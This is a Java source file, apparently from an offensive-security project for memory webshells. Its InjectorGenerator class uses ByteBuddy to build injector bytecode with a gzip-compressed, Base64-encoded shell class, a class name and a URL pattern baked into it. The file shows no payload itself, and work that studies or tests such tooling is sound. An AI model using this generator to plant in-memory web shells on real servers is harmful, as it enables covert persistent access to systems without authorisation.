package com.reajason.javaweb.memsell;

import com.reajason.javaweb.util.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.codec.binary.Base64;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class InjectorGenerator {

    @SneakyThrows
    public byte[] generate(Class<?> injectClass, String injectClassName, String shellClassName, byte[] shellBytes, String urlPattern) {
        String base64String = Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), "");;
        try (DynamicType.Unloaded<?> make = new ByteBuddy()
                .redefine(injectClass)
                .name(injectClassName)
                .method(named("getUrlPattern")).intercept(FixedValue.value(urlPattern))
                .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                .method(named("getClassName")).intercept(FixedValue.value(shellClassName))
                .make()) {
            return make.getBytes();
        }
    }
}
